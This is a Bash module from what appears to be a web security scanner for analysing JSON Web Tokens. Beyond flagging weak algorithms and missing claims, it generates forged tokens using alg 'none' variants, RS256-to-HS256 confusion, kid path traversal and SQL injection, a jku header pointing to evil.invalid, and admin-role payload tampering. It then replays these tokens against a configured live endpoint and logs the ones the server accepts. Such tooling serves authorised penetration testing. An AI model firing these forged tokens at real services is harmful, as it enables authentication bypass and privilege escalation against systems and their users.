# JWT offline analysis and optional live verification

f_oauth_jwt_build_attack_token(){
    local header_b64="$1" payload_b64="$2" sig="${3:-}"
    if [ -n "$sig" ]; then
        echo "${header_b64}.${payload_b64}.${sig}"
    else
        echo "${header_b64}.${payload_b64}."
    fi
}

f_oauth_jwt_encode_json(){
    jq -c . | f_oauth_jwt_b64url_encode
}

f_oauth_jwt_verify_token_live(){
    local token="$1" label="$2" endpoint="$3"
    local slug status body_file

    [ -n "$endpoint" ] || return 0
    slug=$(f_oauth_jwt_slug "$label")
    body_file="$OUTPUT_DIR/jwt_test/live_${slug}_body.txt"

    status=$(f_oauth_jwt_curl -o "$body_file" -w "%{http_code}" \
        -H "Authorization: Bearer ${token}" \
        -H "Accept: application/json" \
        "$endpoint")
    f_oauth_jwt_log "LIVE JWT [$label] $endpoint -> $status"

    {
        echo "label=$label"
        echo "endpoint=$endpoint"
        echo "status=$status"
        echo "token=$(f_oauth_jwt_redact_token "$token")"
    } > "$OUTPUT_DIR/jwt_test/live_${slug}_meta.txt"

    if [[ "$status" =~ ^2 ]]; then
        f_oauth_jwt_record_finding critical jwt "$endpoint" live_token_accepted \
            "Server accepted $label token (HTTP $status)" "jwt_test/live_${slug}_meta.txt"
        echo "$label" >> "$OUTPUT_DIR/jwt_test/live_accepted.txt"
        return 0
    fi
    return 1
}

f_oauth_jwt_check_sensitive_claims(){
    local payload_file="$1"
    local hits
    hits=$(jq -r --argjson keys "$OAUTH_JWT_SENSITIVE_CLAIMS" '
        [$keys[] as $k | .. | objects | to_entries[] | select(.key == $k) | .key] | unique | .[]
    ' "$payload_file" 2>/dev/null)

    if [ -n "$hits" ]; then
        printf '%s\n' "$hits" > "$OUTPUT_DIR/jwt_test/sensitive_claims.txt"
        f_oauth_jwt_record_finding high jwt "token/payload" sensitive_claims \
            "JWT payload contains sensitive claim keys: $(echo "$hits" | tr '\n' ',' | sed 's/,$//')" \
            "jwt_test/sensitive_claims.txt"
    fi
}

f_oauth_jwt_build_privilege_payload(){
    local payload_file="$1" out_file="$2"
    jq '
        if type == "object" then
            (if has("role") and (.role == "user") then .role = "admin" else . end)
            | (if has("roles") and (.roles | type == "array") then .roles += ["admin"] else . end)
            | (if has("isAdmin") and (.isAdmin == false) then .isAdmin = true else . end)
            | (if has("admin") and (.admin == false) then .admin = true else . end)
        else . end
    ' "$payload_file" > "$out_file" 2>/dev/null
}

f_oauth_jwt_analyze_one_token(){
    local JWT="$1"
    local token_dir slug HEADER PAYLOAD SIGNATURE header_json payload_json

    slug=$(printf '%s' "$JWT" | sha256sum | awk '{print substr($1,1,12)}')
    token_dir="$OUTPUT_DIR/jwt_test/${slug}"
    mkdir -p "$token_dir"

    printf '%s\n' "$JWT" > "$token_dir/original_token.txt"

    HEADER=$(printf '%s' "$JWT" | cut -d '.' -f1)
    PAYLOAD=$(printf '%s' "$JWT" | cut -d '.' -f2)
    SIGNATURE=$(printf '%s' "$JWT" | cut -d '.' -f3-)

    header_json=$(f_oauth_jwt_b64url_decode "$HEADER")
    if [ -n "$header_json" ] && echo "$header_json" | jq -e . >/dev/null 2>&1; then
        echo "$header_json" | jq . > "$token_dir/header.json"
    else
        f_oauth_jwt_record_finding high jwt "token/$slug" decode_failed "Could not decode JWT header" "jwt_test/${slug}/header.json"
        return 1
    fi

    payload_json=$(f_oauth_jwt_b64url_decode "$PAYLOAD")
    if [ -n "$payload_json" ] && echo "$payload_json" | jq -e . >/dev/null 2>&1; then
        echo "$payload_json" | jq . > "$token_dir/payload.json"
    else
        f_oauth_jwt_record_finding high jwt "token/$slug" decode_failed "Could not decode JWT payload" "jwt_test/${slug}/payload.json"
        return 1
    fi

    echo -e "${BLUE}[*] Analyzing JWT ${slug}${NC}"

    if jq -e '.alg == "none" or .alg == "None" or .alg == "NONE"' "$token_dir/header.json" >/dev/null 2>&1; then
        f_oauth_jwt_record_finding critical jwt "token/$slug" alg_none "JWT header declares alg none" "jwt_test/${slug}/header.json"
    fi

    if jq -e '.alg == "HS256"' "$token_dir/header.json" >/dev/null 2>&1; then
        f_oauth_jwt_record_finding warning jwt "token/$slug" alg_hs256 \
            "JWT uses HS256 — weak secret may allow forgery" "jwt_test/${slug}/header.json"
    fi

    if jq -e '.alg | test("^HS1")' "$token_dir/header.json" >/dev/null 2>&1; then
        f_oauth_jwt_record_finding critical jwt "token/$slug" weak_alg "JWT uses weak HS1xx algorithm" "jwt_test/${slug}/header.json"
    fi

    if jq -e '.alg | test("^RS1")' "$token_dir/header.json" >/dev/null 2>&1; then
        f_oauth_jwt_record_finding critical jwt "token/$slug" weak_alg "JWT uses weak RS1xx algorithm" "jwt_test/${slug}/header.json"
    fi

    if jq -e 'has("jku")' "$token_dir/header.json" >/dev/null 2>&1; then
        f_oauth_jwt_record_finding high jwt "token/$slug" jku_header \
            "JWT header contains jku (remote JWK set URL)" "jwt_test/${slug}/header.json"
        jq '. + {jku: "https://evil.invalid/jwks.json"}' "$token_dir/header.json" | f_oauth_jwt_encode_json > "$token_dir/jku_attack_header.txt"
        f_oauth_jwt_build_attack_token "$(cat "$token_dir/jku_attack_header.txt")" "$PAYLOAD" "$SIGNATURE" > "$token_dir/jku_attack_token.txt"
    fi

    if jq -e 'has("x5u")' "$token_dir/header.json" >/dev/null 2>&1; then
        f_oauth_jwt_record_finding high jwt "token/$slug" x5u_header \
            "JWT header contains x5u (remote certificate URL)" "jwt_test/${slug}/header.json"
    fi

    for i in 1 2 3 4; do
        case "$i" in
            1) echo -n '{"alg":"none"}' ;;
            2) echo -n '{"alg":"None"}' ;;
            3) echo -n '{"alg":"NONE"}' ;;
            4) echo -n '{"alg":"nOnE"}' ;;
        esac | f_oauth_jwt_b64url_encode > "$token_dir/none_header${i}.txt"
        f_oauth_jwt_build_attack_token "$(cat "$token_dir/none_header${i}.txt")" "$PAYLOAD" "" > "$token_dir/none_empty_${i}.txt"
        [ -n "$SIGNATURE" ] && f_oauth_jwt_build_attack_token "$(cat "$token_dir/none_header${i}.txt")" "$PAYLOAD" "$SIGNATURE" > "$token_dir/none_sig_${i}.txt"
    done

    echo -n '{"alg":"none"}' | f_oauth_jwt_b64url_encode > "$token_dir/none_no_typ_header.txt"
    f_oauth_jwt_build_attack_token "$(cat "$token_dir/none_no_typ_header.txt")" "$PAYLOAD" "" > "$token_dir/none_no_typ_token.txt"

    if jq -e '.alg == "RS256"' "$token_dir/header.json" >/dev/null 2>&1; then
        jq '.alg = "HS256"' "$token_dir/header.json" | f_oauth_jwt_encode_json > "$token_dir/confusion_header.txt"
        f_oauth_jwt_build_attack_token "$(cat "$token_dir/confusion_header.txt")" "$PAYLOAD" "$SIGNATURE" > "$token_dir/confusion_sig_token.txt"
        f_oauth_jwt_build_attack_token "$(cat "$token_dir/confusion_header.txt")" "$PAYLOAD" "" > "$token_dir/confusion_empty_sig_token.txt"
    fi

    if jq -e 'has("kid")' "$token_dir/header.json" >/dev/null 2>&1; then
        jq '.kid = "../../../../../dev/null"' "$token_dir/header.json" | f_oauth_jwt_encode_json > "$token_dir/kid_traversal_header.txt"
        f_oauth_jwt_build_attack_token "$(cat "$token_dir/kid_traversal_header.txt")" "$PAYLOAD" "$SIGNATURE" > "$token_dir/kid_traversal_token.txt"
        jq '.kid = "1 OR 1=1"' "$token_dir/header.json" | f_oauth_jwt_encode_json > "$token_dir/kid_sqli_header.txt"
        f_oauth_jwt_build_attack_token "$(cat "$token_dir/kid_sqli_header.txt")" "$PAYLOAD" "$SIGNATURE" > "$token_dir/kid_sqli_token.txt"
        f_oauth_jwt_record_finding info jwt "token/$slug" kid_present \
            "JWT contains kid parameter — manipulation tokens generated" "jwt_test/${slug}/kid_traversal_token.txt"
    fi

    if [ -z "$SIGNATURE" ]; then
        f_oauth_jwt_record_finding critical jwt "token/$slug" unsigned_token "JWT has no signature segment" "jwt_test/${slug}/original_token.txt"
    fi

    if ! jq -e 'has("exp")' "$token_dir/payload.json" >/dev/null 2>&1; then
        f_oauth_jwt_record_finding critical jwt "token/$slug" missing_exp "JWT missing exp claim" "jwt_test/${slug}/payload.json"
    else
        local exp now
        exp=$(jq -r '.exp' "$token_dir/payload.json")
        now=$(date +%s)
        if [ "$exp" -lt "$now" ]; then
            f_oauth_jwt_record_finding info jwt "token/$slug" expired "JWT is expired" "jwt_test/${slug}/payload.json"
        elif [ "$((exp - now))" -gt 86400 ]; then
            f_oauth_jwt_record_finding warning jwt "token/$slug" long_lived "JWT expiration > 24 hours" "jwt_test/${slug}/payload.json"
        fi
    fi

    for claim in nbf iat aud iss; do
        if ! jq -e "has(\"$claim\")" "$token_dir/payload.json" >/dev/null 2>&1; then
            f_oauth_jwt_record_finding warning jwt "token/$slug" "missing_${claim}" "JWT missing $claim claim" "jwt_test/${slug}/payload.json"
        fi
    done

    f_oauth_jwt_check_sensitive_claims "$token_dir/payload.json"

    if f_oauth_jwt_build_privilege_payload "$token_dir/payload.json" "$token_dir/admin_payload.json" && \
       [ -s "$token_dir/admin_payload.json" ]; then
        cat "$token_dir/admin_payload.json" | f_oauth_jwt_b64url_encode > "$token_dir/admin_payload_b64.txt"
        f_oauth_jwt_build_attack_token "$HEADER" "$(cat "$token_dir/admin_payload_b64.txt")" "$SIGNATURE" > "$token_dir/admin_role_token.txt"
    fi

    jq '.aud = "evil.target"' "$token_dir/payload.json" | f_oauth_jwt_b64url_encode > "$token_dir/evil_aud_payload.txt"
    f_oauth_jwt_build_attack_token "$HEADER" "$(cat "$token_dir/evil_aud_payload.txt")" "$SIGNATURE" > "$token_dir/evil_aud_token.txt"

    if [ -n "$OAUTH_JWT_ENDPOINT" ]; then
        echo -e "${BLUE}[*] Live JWT verification against $OAUTH_JWT_ENDPOINT${NC}"
        f_oauth_jwt_verify_token_live "$JWT" "original" "$OAUTH_JWT_ENDPOINT" || true
        f_oauth_jwt_verify_token_live "$(cat "$token_dir/none_empty_1.txt")" "alg_none_empty" "$OAUTH_JWT_ENDPOINT" || true
        [ -f "$token_dir/confusion_sig_token.txt" ] && f_oauth_jwt_verify_token_live "$(cat "$token_dir/confusion_sig_token.txt")" "alg_confusion_sig" "$OAUTH_JWT_ENDPOINT" || true
        [ -f "$token_dir/confusion_empty_sig_token.txt" ] && f_oauth_jwt_verify_token_live "$(cat "$token_dir/confusion_empty_sig_token.txt")" "alg_confusion_empty" "$OAUTH_JWT_ENDPOINT" || true
        [ -f "$token_dir/admin_role_token.txt" ] && f_oauth_jwt_verify_token_live "$(cat "$token_dir/admin_role_token.txt")" "privilege_escalation" "$OAUTH_JWT_ENDPOINT" || true
        [ -f "$token_dir/jku_attack_token.txt" ] && f_oauth_jwt_verify_token_live "$(cat "$token_dir/jku_attack_token.txt")" "jku_injection" "$OAUTH_JWT_ENDPOINT" || true

        if [ "$OAUTH_JWT_SCAN_MODE" = "full" ]; then
            for i in 2 3 4; do
                f_oauth_jwt_verify_token_live "$(cat "$token_dir/none_empty_${i}.txt")" "alg_none_empty_$i" "$OAUTH_JWT_ENDPOINT" || true
            done
            [ -f "$token_dir/kid_traversal_token.txt" ] && f_oauth_jwt_verify_token_live "$(cat "$token_dir/kid_traversal_token.txt")" "kid_traversal" "$OAUTH_JWT_ENDPOINT" || true
            [ -f "$token_dir/evil_aud_token.txt" ] && f_oauth_jwt_verify_token_live "$(cat "$token_dir/evil_aud_token.txt")" "evil_aud" "$OAUTH_JWT_ENDPOINT" || true
        fi
    fi

    {
        echo "JWT analysis: $slug"
        echo "Redacted: $(f_oauth_jwt_redact_token "$JWT")"
        echo "Header: jwt_test/${slug}/header.json"
        echo "Payload: jwt_test/${slug}/payload.json"
        [ -f "$token_dir/live_accepted.txt" ] && echo "Live accepted: see jwt_test/live_*"
    } >> "$OUTPUT_DIR/jwt_analysis_index.txt"
}

f_jwt_security(){
    local JWT="${1:-}"
    local OUTPUT_DIR="$2"

    f_oauth_jwt_should_run_phase jwt || { f_oauth_jwt_log "Skipping jwt (checkpoint)"; return 0; }

    echo -e "${BLUE}[*] Running JWT security tests.${NC}"
    mkdir -p "$OUTPUT_DIR/jwt_test"
    : > "$OUTPUT_DIR/jwt_analysis_index.txt"

    if [ -n "$JWT" ]; then
        f_oauth_jwt_analyze_one_token "$JWT"
    else
        local list_file token count=0
        f_oauth_jwt_collect_jwt_list
        list_file="$OUTPUT_DIR/jwt_tokens_to_scan.txt"
        if [ ! -s "$list_file" ]; then
            echo -e "${RED}[!] No JWT tokens to analyze${NC}"
            return 1
        fi
        while read -r token; do
            f_oauth_jwt_valid_jwt "$token" || continue
            ((count++))
            f_oauth_jwt_analyze_one_token "$token"
        done < "$list_file"
        echo -e "${YELLOW}[*] Analyzed $count JWT(s)${NC}"
    fi

    {
        echo "JWT Security Test Report"
        echo "Date: $(f_oauth_jwt_now)"
        echo "JWT endpoint: ${OAUTH_JWT_ENDPOINT:-not configured}"
        echo
        cat "$OUTPUT_DIR/jwt_analysis_index.txt" 2>/dev/null
        echo
        echo "Full tokens stored under jwt_test/*/original_token.txt (handle carefully)."
    } > "$OUTPUT_DIR/jwt_security_report.txt"

    f_oauth_jwt_mark_phase jwt
    echo -e "${YELLOW}[*] JWT analysis complete. See jwt_security_report.txt${NC}"
}